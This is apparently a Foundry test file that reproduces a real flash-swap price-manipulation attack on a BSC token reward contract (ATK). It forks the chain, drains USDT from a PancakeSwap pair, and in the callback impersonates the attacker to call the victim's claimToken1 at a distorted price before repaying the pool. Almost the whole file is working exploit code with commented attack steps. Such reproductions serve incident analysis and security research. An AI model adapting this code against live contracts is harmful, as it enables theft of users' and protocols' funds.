// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1580095325200474112
// @Contract address
// https://bscscan.com/tx/0x9e328f77809ea3c01833ec7ed8928edb4f5798c96f302b54fc640a22b3dd1a52 attack
// https://bscscan.com/tx/0x55983d8701e40353fee90803688170a16424ee702f6b21bb198bb8e7282112cd attack
// https://bscscan.com/tx/0x601b8ab0c1d51e71796a0df5453ca671ae23de3d5ec9ffd87b9c378504f99c32 profit

// closed-source Contract is design to deposit and claimReward , the calim Function use getPrice() in ASK Token Contract
// root cause: getPrice() function
//https://github.com/cl2089/etherscan-contract-crawler/blob/d4c97fbf933b828e5bc4b2176bf4ceff1c301c93/bsc_contracts/0x9cB928Bf50ED220aC8f703bce35BE5ce7F56C99c_ATK/ATK.sol#L706
contract ContractTest is DSTest{

    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 ATK = IERC20(0x9cB928Bf50ED220aC8f703bce35BE5ce7F56C99c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    // LP token
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xd228fAee4f73a73fcC73B6d9a1BD25EE1D6ee611);
    uint swapamount;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 22102838);
    }

    function testExploit() public{
        // send 2 BNB to WBNB
        // anon fallback function
        emit log_named_decimal_uint(
            "[Start] USDT balance this",
             USDT.balanceOf(address(this)),
            18
        );
        address(WBNB).call{value: 2 ether}("");
        // swap WBNB to USDT
        WBNBToUSDT();
        emit log_named_decimal_uint(
            "[Start] Attacker ATK balance before exploit",
            ATK.balanceOf(address(0xD7ba198ce82f4c46AD8F6148CCFDB41866750231)),
            18
        );
        // before the swap the LP contract has 131k UST
        emit log_named_decimal_uint(
            "[Start] LP USDT balance before",
             USDT.balanceOf(address(Pair)),
            18
        );

        emit log_named_decimal_uint(
            "[Start] USDT balance this after",
             USDT.balanceOf(address(this)),
            18
        );
        // swap USDT to ATK
        swapamount = USDT.balanceOf(address(Pair)) - 3 * 1e18;
        Pair.swap(swapamount, 0, address(this), new bytes(1));
        // https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/UniswapV2Pair.sol#L159
        /*
             function swap(
                uint256 amount0Out,
                uint256 amount1Out,
                address to,
                bytes calldata data
             )
             this swap function call the call back function pancakeCall
             _token0 is USDT,_token1 is ATK
              if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
              this line send swapamount from LP pool to this contract
         */
         emit log_named_decimal_uint(
            "[End] LP USDT balance after",
             USDT.balanceOf(address(Pair)),
            18
        );

        emit log_named_decimal_uint(
            "[End] Attacker ATK balance after exploit",
            ATK.balanceOf(address(0xD7ba198ce82f4c46AD8F6148CCFDB41866750231)),
            18
        );
    }


    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        cheats.startPrank(0xD7ba198ce82f4c46AD8F6148CCFDB41866750231);
        // call claimToken1 function on victim address
        // https://ethervm.io/decompile/binance/0x96bf2e6cc029363b57ffa5984b943f825d333614#func_claimToken1
        // 0x8a809095 claimToken1()
        // ====   LOG
         emit log_named_decimal_uint(
            "[pancakeCall] Attacker ATK balance before call claimToken1",
            ATK.balanceOf(address(0xD7ba198ce82f4c46AD8F6148CCFDB41866750231)),
            18
        );
        
        // the USDT amount is small, because most of it is sent to this contract
        // now ATK token is cheap. The attacker can claim huge amount
        emit log_named_decimal_uint(
            "[pancakeCall] LP USDT balance before",
            USDT.balanceOf(address(Pair)),
            18
        );
        emit log_named_decimal_uint(
            "[pancakeCall] this USDT balance before",
             USDT.balanceOf(address(this)),
            18
        );
         emit log_named_decimal_uint(
            "[pancakeCall] LP ATK token balance before",
            ATK.balanceOf(address(Pair)),
            18
        );
        // ====
        address(0x96bF2E6CC029363B57Ffa5984b943f825D333614).call(abi.encode(bytes4(0x8a809095)));
        cheats.stopPrank();
         emit log_named_decimal_uint(
            "[pancakeCall] swapamount",
            swapamount,
            18
        );
         emit log_named_decimal_uint(
            "[pancakeCall] swapamount * 10000 / 9975 + 1000",
            swapamount * 10000 / 9975 + 1000,
            18
        );
        // transfer back to LP pool
        USDT.transfer(address(Pair), swapamount * 10000 / 9975 + 1000);
        uint256 USDTAmountAfter = USDT.balanceOf(address(Pair)); //vulnerable point
         emit log_named_decimal_uint(
            "[pancakeCall] LP USDT balance after",
            USDTAmountAfter,
            18
        );
    }

    function WBNBToUSDT() internal {
        WBNB.approve(address(Router), type(uint).max);
        address [] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        emit log_named_decimal_uint(
            "[WBNBToUSDT] WBNB balance",
            WBNB.balanceOf(address(this)),
            18
        );
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }


}